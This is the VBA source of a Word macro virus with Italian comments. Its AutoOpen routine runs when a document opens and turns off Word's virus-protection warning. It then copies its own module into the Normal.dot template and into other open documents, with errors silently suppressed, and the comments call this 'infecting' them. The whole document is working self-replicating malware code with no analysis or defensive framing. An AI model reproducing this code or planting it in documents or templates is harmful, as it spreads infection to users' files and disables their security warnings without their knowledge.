   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Code"
   Sub AutoOpen()
       RemoveProtection
       If Not ActiveDocument = NormalTemplate Then 'Infetta Normal.dot
           CopyVirCodeToModel
       End If
       If Not ActiveDocument = ThisDocument Then   'Infetta il documento aperto
           CopyVirCodeToDocument ActiveDocument
       End If
   End Sub
   Sub CopyVirCodeToModel()
   On Local Error Resume Next
       With ActiveDocument
           .UpdateStylesOnOpen = False
           .AttachedTemplate = "Normal.dot"
       End With
       Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Code", Object:=wdOrganizerObjectProjectItems
       NormalTemplate.Save
   End Sub
   Sub CopyVirCodeToDocument(Target As Document)
       On Local Error Resume Next
       Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=Target.FullName, Name:="Code", Object:=wdOrganizerObjectProjectItems
   End Sub
   Sub RemoveProtection()
       'Disattiva il messaggio di avviso iniziale
       Options.VirusProtection = False
   End Sub
